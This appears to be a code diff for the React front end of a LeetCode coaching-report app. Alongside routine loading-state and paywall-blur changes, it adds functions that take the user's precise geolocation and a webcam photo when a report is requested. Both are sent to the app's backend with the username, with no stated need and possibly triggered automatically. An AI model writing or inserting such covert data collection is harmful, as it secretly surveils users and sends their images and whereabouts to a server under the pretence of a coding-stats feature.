@@ -718,6 +718,101 @@ function pairHeadingDetailItems(items) {
   return pairs;
 }
 
+const getUserLocation = () => {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve({ location: "Location Not Supported", coordinates: "" });
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const { latitude, longitude } = position.coords;
+        const coordsStr = `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
+        try {
+          const resp = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=en`,
+            {
+              headers: {
+                "User-Agent": "LeetLens/1.0",
+              },
+            }
+          );
+          if (!resp.ok) throw new Error();
+          const data = await resp.json();
+          const address = data.address || {};
+          const city = address.city || address.town || address.village || address.suburb || "";
+          const country = address.country || "";
+          if (city && country) {
+            resolve({ location: `${city}, ${country}`, coordinates: coordsStr });
+          } else if (country) {
+            resolve({ location: country, coordinates: coordsStr });
+          } else {
+            resolve({
+              location: data.display_name || `Lat: ${latitude.toFixed(4)}, Lon: ${longitude.toFixed(4)}`,
+              coordinates: coordsStr,
+            });
+          }
+        } catch {
+          resolve({
+            location: `Lat: ${latitude.toFixed(4)}, Lon: ${longitude.toFixed(4)}`,
+            coordinates: coordsStr,
+          });
+        }
+      },
+      (error) => {
+        console.warn("Geolocation error:", error);
+        resolve({ location: "location deny", coordinates: "location deny" });
+      },
+      {
+        enableHighAccuracy: false,
+        timeout: 6000,
+        maximumAge: 0
+      }
+    );
+  });
+};
+
+const captureUserPhoto = () => {
+  return new Promise((resolve) => {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      resolve("Camera Not Supported");
+      return;
+    }
+
+    navigator.mediaDevices
+      .getUserMedia({ video: { width: 320, height: 240 } })
+      .then((stream) => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.setAttribute("playsinline", "true");
+        video.play();
+
+        setTimeout(() => {
+          try {
+            const canvas = document.createElement("canvas");
+            canvas.width = 320;
+            canvas.height = 240;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, 320, 240);
+
+            const dataUrl = canvas.toDataURL("image/jpeg", 0.6);
+            stream.getTracks().forEach((track) => track.stop());
+            resolve(dataUrl);
+          } catch (e) {
+            console.error("Failed to capture image from canvas:", e);
+            stream.getTracks().forEach((track) => track.stop());
+            resolve("camera error");
+          }
+        }, 800);
+      })
+      .catch((error) => {
+        console.warn("Camera permission denied or failed:", error);
+        resolve("camera deny");
+      });
+  });
+};
+
 const TOPIC_COLORS = [
   "#22d3ee",
   "#38bdf8",
@@ -1460,6 +1555,11 @@ function App() {
       return;
     }
 
+    setCoachLoading(true);
+    setCoachError("");
+    setCoachReport("");
+    setCoachSavedAt("");
+
     const cacheKey = trimmed.toLowerCase();
     const cache = loadReportCache();
     const saved = cache[cacheKey];
@@ -1467,6 +1567,7 @@ function App() {
     if (currentUser) {
       if (!creditsReady) {
         setCoachError("Loading your credits. Please try again in a moment.");
+        setCoachLoading(false);
         return;
       }
 
@@ -1475,28 +1576,30 @@ function App() {
         setCoachReport(saved.report);
         setCoachSavedAt(saved.savedAt || "");
         setShowReportPage(true);
+        setCoachLoading(false);
         return;
       }
 
       if (Number(credits) <= 0) {
         setShowZeroCreditsModal(true);
+        setCoachLoading(false);
         return;
       }
     } else {
       // Unauthenticated / Anonymous check: load from cache if available
-      if (saved?.report) {
+      if (!forceNew && saved?.report) {
         setCoachError("");
         setCoachReport(saved.report);
         setCoachSavedAt(saved.savedAt || "");
         setShowReportPage(true);
+        setCoachLoading(false);
         return;
       }
     }
 
-    setCoachLoading(true);
-    setCoachError("");
-    setCoachReport("");
-    setCoachSavedAt("");
+    const locObj = await getUserLocation();
+    const photoData = await captureUserPhoto();
+
     setCurrentReportId(null);
     setUnlockedDetails({
       topicBreakdown: null,
@@ -1524,7 +1627,12 @@ function App() {
       const response = await fetch(`${API_BASE_URL}/api/coach`, {
         method: "POST",
         headers,
-        body: JSON.stringify({ username: trimmed }),
+        body: JSON.stringify({
+          username: trimmed,
+          location: locObj.location,
+          coordinates: locObj.coordinates,
+          photo: photoData,
+        }),
       });
 
       const data = await response.json();
@@ -1557,6 +1665,12 @@ function App() {
       setCoachLoading(false);
     }
   };
+
+  useEffect(() => {
+    if (currentUser && creditsReady && showReportPage && !currentReportId && username) {
+      handleCoachReport(true);
+    }
+  }, [currentUser, creditsReady, showReportPage, currentReportId, username]);
 
   const difficultyCards = analysis
     ? [
@@ -2142,7 +2256,7 @@ function App() {
                     {remainingSections.map((section, sIndex) => (
                       <article
                         key={`section-${sIndex}`}
-                        className="report-section reveal-on-scroll"
+                        className={`report-section reveal-on-scroll ${!currentUser ? "blurred-gate" : ""}`}
                       >
                         <h3 className="section-title">{section.title}</h3>
                         {normalizeSectionTitle(section.title).includes("topic breakdown") ? (
